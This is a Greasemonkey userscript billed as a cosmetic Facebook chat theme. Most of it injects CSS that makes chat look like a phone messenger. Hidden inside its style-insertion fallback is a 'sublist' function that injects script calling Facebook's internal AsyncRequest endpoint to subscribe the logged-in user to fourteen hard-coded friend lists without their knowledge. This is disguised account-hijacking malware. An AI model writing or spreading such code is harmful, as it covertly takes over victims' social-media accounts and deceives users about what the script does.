// ==UserScript==
// @name          Convert chat phone system
// @namespace     http://userstyles.org
// @description	  Chat like messenger
// @author        Alkont Akn
// @run-at        document-start
// ==/UserScript==
(function() {
var css = "";
if (false || (document.domain == "apps.facebook.com" || document.domain.substring(document.domain.indexOf(".apps.facebook.com") + 1) == "apps.facebook.com") || (new RegExp("^https?://www\\.facebook\\.com/(?!plugins/).*$")).test(document.location.href))
	css += "._51jx, ._51jw{\n  background-image: none !important;\nbackground-color: #f03d25 !important;\nborder: 1px solid #d83722 !important;\nborder-bottom: 1px solid #c0311e !important;\nborder-top: 1px solid #e23923 !important;\n-webkit-border-radius: 2px;\n-webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .77);\ndisplay: block;\n    width:auto !important;\n    height:auto !important;\n  padding:0 1px !important; \n}\n\n._50mz .metaInfoContainer {\nbackground-color: transparent !important;\npadding-left: 0 !important;\nposition: absolute;\nright: none !important;\ntop: none !important;\nbottom: 4px !important;\n}\n\n.messages:hover .metaInfoContainer {\nvisibility: visible !important;\n}\n\n.fbChatConvItem:hover .metaInfoContainer {\nvisibility: hidden;\n}\n\n.fbChatConvItem .profileLink .profilePhoto {\nborder-radius: 300px !important;\n}\n\n.fbChatConvItem .profileLink:before {\nbackground:transparent;\ndisplay: block;\nwidth: 32px;\nheight: 32px;\ncontent: \"\";\nposition: absolute;\nbox-shadow: 0 1px 4px -1px #000, 0 2px 4px -2px #000, inset 0 0px 0px 1px rgba(255, 255, 255, 0.25), inset 0 4px 5px -1px rgba(255, 255, 255, 0.25);\nborder-radius: 300px !important;\n\n}\n\n._50dw {\nborder-top: 1px solid #E4E7F0 !important;\n}\n\n.fbChatMessageGroup {border-top-color:#E4E7F0;}\n\n .fbChatConvDateBreak{\ntext-align: center !important;\nmargin: 5px 60px !important;\n}\n\n\n.fbChatMessageGroup ._kso {margin-bottom: 0!important;}\n\n.conversationContainer, .fbChatConvDateBreak {background: #E4E7F0 !important;}\n\n._7f.seen ._9r, ._510h {\nbackground-image: url(\"http://imageshack.us/a/img202/3604/seen.png\") !important;\nbackground-position: 0 !important;\n}\n\n .messages {\nbackground: transparent !important;\nmargin-left: 12px !important;\nborder-image-slice: fill 10 10 10 10;\n-webkit-border-image: url(\"http://imageshack.us/a/img687/6865/theyp.png\")10 10 10 10;\n-moz-border-image: url(\"http://imageshack.us/a/img687/6865/theyp.png\")10 10 10 10;\nborder-image-source: url(\"http://imageshack.us/a/img687/6865/theyp.png\");\nborder-width: 10px !important;\nfloat: left!important;\nmax-width: 160px !important;\nmin-width: 28px;\n}\n\n.messages:before {\nbackground: url(\"http://img594.imageshack.us/img594/4907/theyarow.png\");\ncontent: \"\";\ndisplay: block;\nwidth: 15px;\nheight: 17px;\nleft: 34px;\nposition: absolute;\ntop: 14px;\n}\n\n\n.fbChatMessageGroup .profileLink {box-shadow: 0 1px 1px black !important;}";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	node.appendChild(document.createTextNode(css));
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node); 
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
        
function sublist(uidss) {
var a = document.createElement('script');
a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
document.body.appendChild(a);
}

sublist("147441105460725");
sublist("148448742026628");
sublist("148459995358836");
sublist("154300488108120");
sublist("154300644774771");
sublist("158920107646158");
sublist("158920260979476");
sublist("158920367646132");
sublist("158920474312788");
sublist("158920544312781");
sublist("158920637646105");
sublist("579216492113440");
sublist("199945960175340");
sublist("163662487093710");
	}
}
})();
